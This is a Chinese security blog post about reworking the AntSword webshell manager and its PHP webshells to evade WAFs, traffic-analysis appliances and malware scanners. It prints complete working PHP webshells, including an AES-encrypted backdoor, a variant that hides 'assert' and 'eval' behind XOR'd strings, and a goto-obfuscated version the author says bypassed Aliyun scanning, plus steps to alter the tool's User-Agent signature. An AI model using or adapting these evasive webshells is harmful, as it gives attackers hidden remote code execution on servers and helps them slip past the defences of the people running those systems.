<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yTmipL9HlPB4a0oQ-qy_3Q)

0x00 前言：
--------

为什么会有改造蚁剑的想法，之前看到有做冰蝎的流量加密，来看到绕过 waf，改造一些弱特征，通过流量转换，跳过密钥交互。

但是，冰蝎需要反编译去改造源码，再进行修复 bug，也比较复杂。而 AntSword 相对于冰蝎来说，不限制 webshell，即一句话也可以进行连接，还可以自定义编码器和解码器，可以很容易让流量做到混淆。

0x01 蚁剑介绍及其改编：
--------------

关于蚁剑的介绍，这里就不多说了，一个连接 webshell 的管理器，使用前端 nodejs 进行编码。AntSword 给我最大的好处是可以连接一句话木马，而且可以自定义编码器和解码器。这让我们就有了很多种 webshell 的变换。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5hCtT3LkPjBJWnd9hX3mRmEiceCq9jdeTFOy3bbpxD3rPRPldDW81XFfJMBiaOHKenlVLeG8L1jsoQ/640?wx_fmt=png)

但是，蚁剑默认的编码器和菜刀都是一样的，这里用 burpsuite 来进行抓包看下流量。

#### 蚁剑默认流量

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5hCtT3LkPjBJWnd9hX3mRmv2DlnfNXE0ARrnN9J3zNSEwoZPWq4Uzh0cbzEKujKmv7S9n6kuW5nw/640?wx_fmt=png)

返回来的是默认蚁剑的默认流量，所以的话，这里就基本上过不去态势感知和 waf，所以很容易想到了编码器和解码器的选择，可以进行流量的改造来进行 waf 的绕过，先选用最默认的 base64 进行测试。

#### 默认的 base64 编码器

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5hCtT3LkPjBJWnd9hX3mRmARtRCyy0g4xY0icNiaPD3y1dPbwmIIbClKf3VgysNWnOt3fTZYIM66Zg/640?wx_fmt=png)

但是看到了使用 base64 编码之后是有 eval 字样的，这样的话，肯定被态势感知和全流量一体机来进行特征的抓取，肯定会报威胁。

#### 去 github 上找到蚁剑的编码器和对应的解码器

github 地址：https://github.com/AntSwordProject/AwesomeEncoder/tree/master/php 这里下载默认的 aes-128 的默认流量。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5hCtT3LkPjBJWnd9hX3mRms1tyPAIatxWkdPXcXfUXsqlaY5mJ7JtiaydGFCTTJ2UwFFVIzaZian6Q/640?wx_fmt=png)

这里进行流量抓取。里面自带了 php 的 webshell。

```
<?php
@session_start();
$pwd='ant';
$key=@substr(str_pad(session_id(),16,'a'),0,16);
@eval(openssl_decrypt(base64_decode($_POST[$pwd]), 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING));
?>


```

##### 默认 webshell 讲解：

```
这里打开session_start，然后截取Cookie中的PHPSESSION的16位。
然后进行aes加密，密码为pwd


```

再 D 盾，河马和阿里云进行扫描：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5hCtT3LkPjBJWnd9hX3mRmm8nfeOKcsYGL9FTgsRplE3YPIOUEvvTBjNT9PsIicfb7DqwQ8meNoWA/640?wx_fmt=png)

河马没有查出来，可能是比较弱

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5hCtT3LkPjBJWnd9hX3mRmAQwP6cOjNFtzwL3Mbc2WVfPMaHicRSUNPS8yoPER1vJw9tDp6w6uXzA/640?wx_fmt=png)

阿里云直接报恶意

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5hCtT3LkPjBJWnd9hX3mRmoIDVsXKKZnIgHiaYwm6u8LV5ChHPyRHqWSrRugBLxiazfPp13ibQic3Chg/640?wx_fmt=png)

#### 初步修改后的 webshell：

这里先做代码修改，直接放出我修改之后的 webshell 代码。

```
<?php
@session_start();
error_reporting(E_ALL^E_NOTICE^E_WARNING);
function decode($key,$data){
$data_new = '';
for($i=0;$i<=strlen($data);$i++){
$b=$data[$i]^$key;
$data_new = $data_new.urldecode($b);
}
define('ass',$data_new[0].strrev($data_new)[2].strrev($data_new)[2].$data_new[11].strrev($data_new)[4].strrev($data_new)[0]);
define('ev',$data_new[11].strrev($data_new)[8].$data_new[0].strrev($data_new)[6].'($result)');
return $data_new;
}
function decrypto($key,$data){
$data = base64_decode($data);
$result = openssl_decrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);
decode('\\','=:=om>n?o8h9i:j;k*d0e.l/m(');
$ass=ass;
$ass(ev);
}
class run{
    public $data;
    public function __construct(){
$this->data = '#````````#'.$_POST[1]."#`#`#";
$this->data = $this->data."123456";
}
}
$key=@substr(str_pad(session_id(),16,'a'),0,16);
$run = new run();
decrypto($key,$run->data);
?>


```

这里能过去 D 盾的静态，但是无法绕过阿里云查杀。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5hCtT3LkPjBJWnd9hX3mRmATsGicVfw3IrZdHK3vMDj8a7HxL7QnO9zBXaCBwukRtKzX1qP9XJkyA/640?wx_fmt=png)

所以这里还需要进行代码混淆。（这也是之后 webshell 免杀常常用到的）

#### 混淆之后的 webshell：

这里提供 php 在线加密的站

```
https://enphp.djunny.com/


```

这里加密之后生成 webshell。如下：

```
<?php
 goto Zc4oD; UJih6: function decrypto($key, $data) { goto LBrqg; P6YrI: $ass = ass; goto aR6yN; svn0O: $result = openssl_decrypt($data, "\x41\x45\x53\x2d\x31\x32\70\55\105\x43\x42", $key, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING); goto ATbMy; LBrqg: $data = base64_decode($data); goto svn0O; ATbMy: decode("\x5c", "\75\72\x3d\157\x6d\x3e\x6e\x3f\x6f\x38\x68\71\151\x3a\x6a\x3b\x6b\x2a\x64\x30\x65\56\x6c\57\155\50"); goto P6YrI; aR6yN: $ass(ev); goto k6RVH; k6RVH: } goto DGZMG; WvjFi: ini_set("\144\151\x73\160\x6c\x61\x79\x5f\145\162\x72\x6f\162\x73", "\117\146\x66"); goto Wguwk; DGZMG: class run { public $data; public function __construct() { $this->data = "\43\140\x60\140\140\x60\140\x60\x60\43" . $_POST[1] . "\x23\140\x23\140\43"; } } goto Berxy; UUYvT: $run = new run(); goto apKNY; Berxy: $key = @substr(str_pad(session_id(), 16, "\141"), 0, 16); goto UUYvT; Zc4oD: @session_start(); goto WvjFi; Wguwk: function decode($key, $data) { goto LGJR3; Ef77S: $i = 0; goto KvZGg; rSTXM: define("\141\x73\x73", $data_new[0] . strrev($data_new)[2] . strrev($data_new)[2] . $data_new[11] . strrev($data_new)[4] . strrev($data_new)[0]); goto TQ6r4; Tbglr: return $data_new; goto FsE2S; tm2qt: goto I39OV; goto eF7jG; AqTZZ: $data_new = $data_new . urldecode($b); goto FriN_; TQ6r4: define("\x65\166", $data_new[11] . strrev($data_new)[8] . $data_new[0] . strrev($data_new)[6] . "\50\x24\x72\145\163\165\154\x74\51"); goto Tbglr; FriN_: bLexq: goto gITff; eF7jG: RuTl1: goto rSTXM; gITff: $i++; goto tm2qt; KdSCg: if (!($i <= strlen($data))) { goto RuTl1; } goto d9N4J; d9N4J: $b = $data[$i] ^ $key; goto AqTZZ; LGJR3: $data_new = ''; goto Ef77S; KvZGg: I39OV: goto KdSCg; FsE2S: } goto UJih6; apKNY: decrypto($key, $run->data);


```

经过加密之后，可以发现，进行了 goto 的混淆，所以这里就达到了代码混淆。因为之前绕过了 D 盾和河马，这里直接去阿里云查杀。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5hCtT3LkPjBJWnd9hX3mRmEg5EFSdN88Ur3LngsT6rQd00l1ibIfpH2icW1T1TYhRibgGEJZkmxqmqA/640?wx_fmt=png)

已经成功绕过阿里云查杀。用 burpsuite 抓下流量特征。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5hCtT3LkPjBJWnd9hX3mRmp1GLiavyibmfYLRrkJVS1ibHzL5B4ibQtIs7J5icibvhuMWdZ1a7oRyzPs6Q/640?wx_fmt=png)

从流量加密来分析的话，已经能绕过态势感知和全流量分析机。

0x02 蚁剑 UA 头的修改：
----------------

#### 在 burp 的数据包中能清楚的看到蚁剑的特征

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5hCtT3LkPjBJWnd9hX3mRml1aIQRG0OPu9gZVEWn3BBgobdC1RMLW7jVOb8tNycQkUoKoEC4n9Ig/640?wx_fmt=png)

#### 在目录 / modules/request.js 文件中修改 UA 头

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5hCtT3LkPjBJWnd9hX3mRmkQ4ibtJQXNbEWlDDcg42a3bJibkxGvAOZdz6axIquCvXMUicv2nj94bMQ/640?wx_fmt=png)

#### /modules/update.js 文件修改

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5hCtT3LkPjBJWnd9hX3mRmoeq9gGRjtP5RBZIicZHM1iaicPEhhqxYjFLyic2WLJBflhU4xNB3rTL6AQ/640?wx_fmt=png)

0x03 总结：
--------

关于免杀来说，通常是进行代码加密混淆，特征码替换或者分割传输等情况。之前有想写过 shellcode 免杀，但是还没有过 windows defender，所以就推迟一段时间来写。感谢各位拜读。

Tip：这个马目前已经过不了阿里了，已经被阿里抓特征了。但是整体思路没有改变，所以大家可以自己去发挥思路去整合。

加下方 wx，拉你一起进群学习

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v4xQApknGdLTDr8wRfG76hjlOvMhvZ9LgUtEH9SocyORQ1VCWaJwq6FCh3iaib0TVRPOTRFKB24Wibxw/640?wx_fmt=jpeg)

官网地址：https://sec.zianstudy.com